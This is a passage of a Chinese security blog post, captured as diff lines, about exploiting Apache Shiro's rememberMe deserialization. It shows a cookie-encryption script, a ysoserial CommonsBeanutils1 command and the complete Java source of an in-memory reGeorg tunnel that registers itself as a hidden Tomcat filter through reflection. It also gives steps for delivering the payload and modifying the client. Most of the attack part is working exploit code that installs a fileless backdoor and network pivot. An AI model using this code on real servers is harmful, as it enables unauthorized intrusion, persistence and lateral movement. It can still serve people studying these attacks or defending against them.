class="line">payload=base64.b64decode(sys.argv[<span class="number">1</span>])</span><br><span class="line">BS   = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">payload=pad(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(IV + encryptor.encrypt(payload)))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_cookie.py `java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_ClassLoader anything |<span class="built_in">base64</span> |sed <span class="string">&#x27;:label;N;s/\n//;b label&#x27;</span>`</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="改造reGeorg"><a href="#改造reGeorg" class="headerlink" title="改造reGeorg"></a>改造reGeorg</h3><p>对于reGeorg服务端的更改其实也就是request等对象的获取方式，为了方便注册filter，我直接让该类实现了Filter接口，在doFilter方法中完成reGeorg的主要逻辑，在equals方法中进行filter的动态注册</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reGeorg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemReGeorg</span> <span class="keyword">implements</span> <span class="title class_">javax</span>.servlet.Filter&#123;</span><br><span class="line">    <span class="keyword">private</span> javax.servlet.http.<span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> javax.servlet.http.<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request1, ServletResponse response1, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        javax.servlet.http.<span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (javax.servlet.http.HttpServletRequest)request1;</span><br><span class="line">        javax.servlet.http.<span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (javax.servlet.http.HttpServletResponse)response1;</span><br><span class="line">        javax.servlet.http.<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;X-CMD&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;OK&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd.compareTo(<span class="string">&quot;CONNECT&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">target</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;X-TARGET&quot;</span>);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> Integer.parseInt(request.getHeader(<span class="string">&quot;X-PORT&quot;</span>));</span><br><span class="line">                    java.nio.channels.<span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> java.nio.channels.SocketChannel.open();</span><br><span class="line">                    socketChannel.connect(<span class="keyword">new</span> <span class="title class_">java</span>.net.InetSocketAddress(target, port));</span><br><span class="line">                    socketChannel.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">                    session.setAttribute(<span class="string">&quot;socket&quot;</span>, socketChannel);</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;OK&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (java.net.UnknownHostException e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-ERROR&quot;</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;FAIL&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-ERROR&quot;</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;FAIL&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">&quot;DISCONNECT&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                java.nio.channels.<span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    socketChannel.socket().close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                session.invalidate();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">&quot;READ&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                java.nio.channels.<span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    java.nio.<span class="type">ByteBuffer</span> <span class="variable">buf</span> <span class="operator">=</span> java.nio.ByteBuffer.allocate(<span class="number">512</span>);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> socketChannel.read(buf);</span><br><span class="line">                    <span class="type">ServletOutputStream</span> <span class="variable">so</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">                    <span class="keyword">while</span> (bytesRead &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        so.write(buf.array(),<span class="number">0</span>,bytesRead);</span><br><span class="line">                        so.flush();</span><br><span class="line">                        buf.clear();</span><br><span class="line">                        bytesRead = socketChannel.read(buf);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;OK&quot;</span>);</span><br><span class="line">                    so.flush();</span><br><span class="line">                    so.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-ERROR&quot;</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;FAIL&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">&quot;FORWARD&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                java.nio.channels.<span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">readlen</span> <span class="operator">=</span> request.getContentLength();</span><br><span class="line">                    <span class="type">byte</span>[] buff = <span class="keyword">new</span> <span class="title class_">byte</span>[readlen];</span><br><span class="line">                    request.getInputStream().read(buff, <span class="number">0</span>, readlen);</span><br><span class="line">                    java.nio.<span class="type">ByteBuffer</span> <span class="variable">buf</span> <span class="operator">=</span> java.nio.ByteBuffer.allocate(readlen);</span><br><span class="line">                    buf.clear();</span><br><span class="line">                    buf.put(buff);</span><br><span class="line">                    buf.flip();</span><br><span class="line">                    <span class="keyword">while</span>(buf.hasRemaining()) &#123;</span><br><span class="line">                        socketChannel.write(buf);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;OK&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-ERROR&quot;</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;FAIL&quot;</span>);</span><br><span class="line">                    socketChannel.socket().close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterChain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        Object[] context=(Object[]) obj;</span><br><span class="line">        <span class="built_in">this</span>.session = (javax.servlet.http.HttpSession ) context[<span class="number">2</span>];</span><br><span class="line">        <span class="built_in">this</span>.response = (org.apache.catalina.connector.Response) context[<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">this</span>.request = (javax.servlet.http.HttpServletRequest) context[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            dynamicAddFilter(<span class="keyword">new</span> <span class="title class_">MemReGeorg</span>(),<span class="string">&quot;reGeorg&quot;</span>,<span class="string">&quot;/*&quot;</span>,request);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">dynamicAddFilter</span><span class="params">(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request)</span> <span class="keyword">throws</span> IllegalAccessException &#123;</span><br><span class="line">        javax.servlet.ServletContext servletContext=request.getServletContext();</span><br><span class="line">        <span class="keyword">if</span> (servletContext.getFilterRegistration(name) == <span class="literal">null</span>) &#123;</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            org.apache.catalina.core.<span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line">            org.apache.catalina.core.StandardContext standardContext=<span class="literal">null</span>;</span><br><span class="line">            java.lang.reflect.Field stateField=<span class="literal">null</span>;</span><br><span class="line">            javax.servlet.FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                contextField=servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                contextField=applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line">                stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">                stateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">                filterRegistration = servletContext.addFilter(name, filter);</span><br><span class="line">                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;url&#125;);</span><br><span class="line">                java.lang.reflect.<span class="type">Method</span> <span class="variable">filterStartMethod</span> <span class="operator">=</span> org.apache.catalina.core.StandardContext.class.getMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">                filterStartMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                filterStartMethod.invoke(standardContext, <span class="literal">null</span>);</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                ;</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>编译后使用如下命令得到其字节码的base64</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> MemReGeorg.class|<span class="built_in">base64</span> |sed <span class="string">&#x27;:label;N;s/\n//;b label&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>在Cookie处填入 rememberMe&#x3D;[ysoserial生成的POC]，POST包体填入classData&#x3D;[MemReGeorg类字节码的base64]，注意POST中参数需要URL编码，发包</p>
+<p><img src="/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200703151537094.png" alt="image-20200703151537094"></p>
+<p>然后带上<code>X-CMD:l3yx</code>header头再请求页面，返回<code>X-STATUS: OK</code>说明reGeorg已经正常工作</p>
+<p><img src="/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200703151808170.png" alt="image-20200703151808170"></p>
+<p>reGeorg客户端也需要修改一下，原版会先GET请求一下网页判断是否是reGeorg的jsp页面，由于这里是添加了一个filter，正常访问网页是不会有变化的，只有带上相关头才会进入reGeorg代码，所以需要将客户端中相关的验证去除</p>
+<p>在askGeorg函数第一行增加return True即可</p>
+<p><img src="/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200703150835555.png" alt="image-20200703150835555"></p>
+<p>连接reGeorg</p>
+<p><img src="/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200703151936423.png" alt="image-20200703151936423"></p>
+<p><img src="/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200703152027686.png" alt="image-20200703152027686"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2744">https://xz.aliyun.com/t/2744</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7388">https://xz.aliyun.com/t/7388</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/ysoserial/" rel="tag"># ysoserial</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/06/30/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/" rel="prev" title="Apache Shiro权限绕过漏洞分析(CVE-2020-11989)">
+                  <i class="fa fa-angle-left"></i> Apache Shiro权限绕过漏洞分析(CVE-2020-11989)
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/08/25/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/" rel="next" title="Apache Dubbo 反序列化漏洞复现笔记">
+                  Apache Dubbo 反序列化漏洞复现笔记 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">淚笑</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
